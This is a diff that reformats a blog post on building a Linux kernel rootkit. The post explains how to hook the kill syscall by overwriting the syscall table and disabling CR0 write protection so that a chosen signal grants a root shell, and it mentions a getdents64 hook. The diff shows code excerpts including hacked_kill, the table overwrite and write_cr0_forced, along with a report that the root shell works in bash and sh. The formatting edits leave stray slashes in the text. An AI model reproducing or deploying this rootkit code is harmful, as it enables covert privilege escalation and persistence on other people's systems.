+   line2 :&nbsp; `int sig = (int) pt_regs->si` => Stores the passed argument, in this case it is: `64`, [source](https://xcellerator.github.io/posts/linux_rootkits_03/) (Only the 1st portion before _Hooking kill_).
 
-                  Now, if the passed argument/ signal (or sig) is same as `GET_ROOT` (which is a macro defined) then we are gifted with a _rootshell_.
+   Now, if the passed argument/ signal (or sig) is same as `GET_ROOT` (which is a macro defined) then we are gifted with a _rootshell_.
 
-                  #### Now the question comes, "Why _`si`_ register, why not _`rsi`_ register?"
+   #### Now the question comes, "Why _`si`_ register, why not _`rsi`_ register?"
 
-                  ***Ans***: Please follow the [commented lines](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12).
+   ***Ans***: Please follow the [commented lines](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12).
 
-                  I have told you earlier that the function type of original syscall must be same as the created syscall.
-                  ```
+   I have told you earlier that the function type of original syscall must be same as the created syscall.
+```
                   static unsigned long *__sys_call_table;
                   
                   typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
@@ -1065,11 +1054,11 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
 
                   static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
                   __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
-                  ```
-                  If you compare all the lines, you will see each function types are satisfying other function types, i.e. there is no function type mismatch. Although, if it doesn't match, obviously compiler will through you an error. I just showed this portion to you, as I was dealing with this same problem while creating this project.
+```
+   If you compare all the lines, you will see each function types are satisfying other function types, i.e. there is no function type mismatch. Although, if it doesn't match, obviously compiler will through you an error. I just showed this portion to you, as I was dealing with this same problem while creating this project.
 
-          6. So, the whole code to get the rootshell via `sys_kill interception`:
-                ```c
+   6. So, the whole code to get the rootshell via `sys_kill interception`:
+```c
                   // filename: Test_hook_kill.h
 
                   #include <linux/syscalls.h>     /* Needed to use syscall functions */
@@ -1207,11 +1196,11 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                     pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
                     write_cr0_forced(cr0 & ~0x00010000);	// Setting WP flag to 0 => writable
                   }
-                ```
-                Here, the type of this function is `asmlinkage int`, actually it doesn't matter in this context, but it might in others.
-                Syscalls are of type `long`, thus, when a user space program such as glibc depends on its return value, it expects a `long int`, if you feed it with `int`, things will go very wrong.
+```
+   Here, the type of this function is `asmlinkage int`, actually it doesn't matter in this context, but it might in others./
+                Syscalls are of type `long`, thus, when a user space program such as glibc depends on its return value, it expects a `long int`, if you feed it with `int`, things will go very wrong./
                 Credit: [jm33.me/](https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html)
-                ```c
+```c
                 // filename: Test_rtkit_kill.c
 
                 #include <linux/init.h>		/* Needed for the macros */
@@ -1290,14 +1279,14 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
               MODULE_AUTHOR("reveng007");
               MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
               MODULE_VERSION("1.0");
-              ```
-              Now, lets see it in action:
+```
+   Now, lets see it in action:
 
-              ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog13.png?raw=true)
+   ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog13.png?raw=true)
 
-              We can see 3 things:
-              1. In ***fish shell***, this mechanism of getting root shell is not working, I don't really know why... (<ins>If any viewers seeing this, have any solution to this problem, please don't hesitate to do a PR to my repo but before that please visit, [idea](https://github.com/reveng007/reveng_rtkit#note-1)</ins>).
-              2. In ***bash shell***, it is working as expected.
+   We can see 3 things:/
+              1. In ***fish shell***, this mechanism of getting root shell is not working, I don't really know why... (<ins>If any viewers seeing this, have any solution to this problem, please don't hesitate to do a PR to my repo but before that please visit, [idea](https://github.com/reveng007/reveng_rtkit#note-1)</ins>)./
+              2. In ***bash shell***, it is working as expected./
               3. In ***sh shell***, it is working as expected too.
 
       2. **getdents64** syscall: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L487)
@@ -2023,4 +2012,5 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
 
                    With this, I have come to the end of the blog. I will be updating the blog as soon as I make some changes to my `reveng_rtkit`rootkit.
                    If you have any query, you can reach me at any of my social media. Till then, see yaa!
+
 
